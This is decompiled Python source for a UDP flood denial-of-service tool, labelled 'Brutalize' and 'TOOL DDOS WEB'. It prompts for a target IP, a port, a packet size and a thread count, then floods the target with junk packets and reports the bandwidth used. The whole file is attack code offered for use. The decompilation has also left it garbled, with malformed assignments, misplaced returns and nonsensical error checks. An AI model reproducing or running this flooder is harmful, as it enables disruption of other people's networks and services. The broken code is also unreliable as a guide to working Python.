# Source Generated with Decompyle++
# File: 00_dump_(code)_306.txt_pyc.pyc (Python 3.11)

from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import choices, randint
from time import time, sleep
from pystyle import *
from getpass import getpass as hinput

class Brutalize:
    
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.client = socket(family = AF_INET, type = SOCK_DGRAM)
        self.data = str.encode('x' * self.force)
        self.len = len(self.data)

    
    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target = self.send).start()
            Thread(target = self.info).start()
            return None

    
    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000
        if self.on:
            sleep(interval)
            if not self.on:
                return None
            if None != 0:
                (self.total += (self.sent * bytediff / gb) * interval).total = None
                print(stage(f'''{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {'                    '}'''), end = '\r')
            now2 = time()
            if now + 1 >= now2:
                pass
            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1
            return None

    
    def stop(self):
        self.on = False

    
    def send(self):
        if self.on:
            self.client.sendto(self.data, self._randaddr())
            (self.sent += self.len).sent = None
            return None

    
    def _randaddr(self):
        return (self.ip, self._randport())

    
    def _randport(self):
        if not self.port:
            pass
        return randint(1, 65535)


ascii = '\n\n'
import os
import sys
import requests
from time import sleep
from pystyle import *
from time import strftime
from datetime import datetime, timedelta
now = datetime.now()
if os.name == 'nt':
    pass
'cls'('clear')
banner = 'TOOL DDOS WEB')
banner = Add.Add(ascii, banner, center = True)
fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white
blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))

def init():
    (System.Size(140, 40), System.Title('.B.r.u.t.e. .-. .b.y. .b.i.l.l.y.t.h.e.g.o.a.t.3.5.6.'.replace('.', '')))
    Cursor.HideCursor()

init()

def stage(text, symbol = ('...',)):
    col1 = purple
    col2 = white
    return f''' {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}'''


def error(text, start = ('\n',)):
    hinput(f'''{start} {Col.Symbol('!', fluo, white)} {fluo}{text}''')
    exit()


def main():
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
    ip = input(stage(f'''Enter the IP to Brutalize {purple}->{fluo2} ''', '?'))
    print()
    if ip.count('.') != 3:
        int('error')
    int(ip.replace('.', ''))
    error('Error! Please enter a correct IP address.')
    port = input(stage(f'''Enter port {purple}[{white}press {fluo2}enter{white} to attack all ports{purple}] {purple}->{fluo2} ''', '?'))
    print()
    if port == '':
        port = None
    port = int(port)
    if port not in range(1, 65536):
        int('error')
        if ValueError:
            error('Error! Please enter a correct port.')
    force = input(stage(f'''Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ''', '?'))
    print()
    if force == '':
        force = 1250
    force = int(force)
    if ValueError:
        error('Error! Please enter an integer.')
    threads = input(stage(f'''Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ''', '?'))
    print()
    if threads == '':
        threads = 100
    threads = int(threads)
    if ValueError:
        error('Error! Please enter an integer.')
    print()
    cport = f'''{purple}:{fluo2}{port}'''
    print(stage(f'''Starting attack on {fluo2}{ip}{cport}{white}.'''), end = '\r')
    brute = Brutalize(ip, port, force, threads)
    brute.flood()
    ''
    brute.stop()
    error('A fatal error has occured and the attack was stopped.', '')
    sleep(1000000)
    if KeyboardInterrupt:
        port
        brute.stop()
        print(stage(f'''Attack stopped. {fluo2}{ip}{cport}{white} was Brutalized with {fluo}{round(brute.total, 1)} {white}Gb.''', '.'))
    print('\n')
    sleep(1)
    hinput(stage(f'''Press {fluo2}enter{white} to {fluo}exit{white}.''', '.'))

if __name__ == '__main__':
    main()
    return None
return os.system
